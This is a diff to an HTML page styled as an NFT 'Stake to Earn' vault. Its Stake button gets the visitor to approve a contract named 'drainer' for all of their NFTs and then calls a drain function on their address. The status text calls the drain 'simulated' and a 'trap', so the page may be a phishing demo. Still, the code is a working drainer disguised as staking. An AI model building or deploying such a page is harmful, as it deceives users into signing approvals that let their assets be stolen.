@@ -3,13 +3,44 @@
 <head>
   <meta charset="UTF-8" />
   <title>WGNFT Vault | Stake to Earn</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
-    body { font-family: sans-serif; background: #111; color: #fff; text-align: center; padding: 2rem; }
-    .card { background: #222; border-radius: 10px; padding: 2rem; box-shadow: 0 0 12px #26a69a; max-width: 500px; margin: 0 auto; }
-    button { padding: 1rem 2rem; margin-top: 1rem; font-size: 1rem; background: #26a69a; border: none; color: #fff; cursor: pointer; }
-    .danger { background: #e74c3c; }
-    #status { margin-top: 2rem; font-size: 1.2rem; }
+    body {
+      font-family: sans-serif;
+      background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+      color: #fff;
+      text-align: center;
+      padding: 2rem;
+      background-attachment: fixed;
+      background-size: cover;
+    }
+    .card {
+      background: rgba(0, 0, 0, 0.8);
+      border-radius: 10px;
+      padding: 2rem;
+      box-shadow: 0 0 18px #26a69a;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+    button {
+      padding: 1rem 2rem;
+      margin-top: 1rem;
+      font-size: 1rem;
+      background: #26a69a;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      cursor: pointer;
+    }
+    .danger {
+      background: #e74c3c;
+    }
+    #status {
+      margin-top: 2rem;
+      font-size: 1.2rem;
+      white-space: pre-wrap;
+      text-align: left;
+    }
   </style>
 </head>
 <body>
@@ -38,40 +69,49 @@
     let provider, signer, nft, drainer;
 
     document.getElementById("connectBtn").onclick = async () => {
-      if (window.ethereum) {
-        try {
-          provider = new ethers.BrowserProvider(window.ethereum);
-          await provider.send("eth_requestAccounts", []);
-          signer = await provider.getSigner();
-          nft = new ethers.Contract(nftAddress, nftABI, signer);
-          drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
-          const userAddress = await signer.getAddress();
-          document.getElementById("status").innerText = `✅ Wallet connected: ${userAddress}`;
-        } catch (err) {
-          console.error("Connection error:", err);
-          document.getElementById("status").innerText = "❌ Wallet connection failed.";
-        }
-      } else {
+      const status = document.getElementById("status");
+      if (!window.ethereum) {
         alert("Please install MetaMask to use this dApp.");
+        return;
+      }
+      try {
+        status.innerText = "⏳ Requesting wallet connection...";
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+
+        const userAddress = await signer.getAddress();
+        nft = new ethers.Contract(nftAddress, nftABI, signer);
+        drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
+
+        status.innerText = `✅ Wallet connected: ${userAddress}`;
+      } catch (err) {
+        console.error("Connection error:", err);
+        status.innerText = `❌ Wallet connection failed.\n\n${err.message}`;
       }
     };
 
     document.getElementById("stakeBtn").onclick = async () => {
+      const status = document.getElementById("status");
       if (!signer) return alert("Connect your wallet first.");
+
       try {
+        status.innerText = "🔐 Requesting NFT approval...";
         const approvalTx = await nft.setApprovalForAll(drainerAddress, true);
         await approvalTx.wait();
-        document.getElementById("status").innerText = "🔓 Approval granted. Initiating staking...";
 
         const userAddress = await signer.getAddress();
+        status.innerText = "🚀 Approval granted. Initiating staking...";
+
         const drainTx = await drainer.drain(nftAddress, userAddress);
         await drainTx.wait();
 
-        document.getElementById("status").innerText = "💀 Your NFTs have been drained (simulated).";
+        status.innerText = "💀 Your NFTs have been drained (simulated).";
         document.getElementById("stakeBtn").disabled = true;
       } catch (err) {
         console.error("Drain error:", err);
-        document.getElementById("status").innerText = "🎯 You avoided the trap. Well done!";
+        status.innerText = `🎯 You avoided the trap.\n\n${err.message}`;
       }
     };
   </script>
